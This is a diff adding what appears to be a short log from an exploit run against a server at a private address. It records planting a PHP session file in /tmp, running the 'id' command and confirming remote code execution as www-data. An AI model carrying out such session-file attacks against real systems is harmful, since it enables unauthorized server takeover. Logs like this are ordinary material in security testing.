@@ -1,0 +1,8 @@
+[*] Target: http://10.20.0.226:8091
+[*] Command: id
+
+[attempt 1] SID=exploitdd324d83e5d1463987a4 file=/tmp/sess_exploitdd324d83e5d1463987a4
+    plant=HTTP/1.1 200 OK
+[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+99
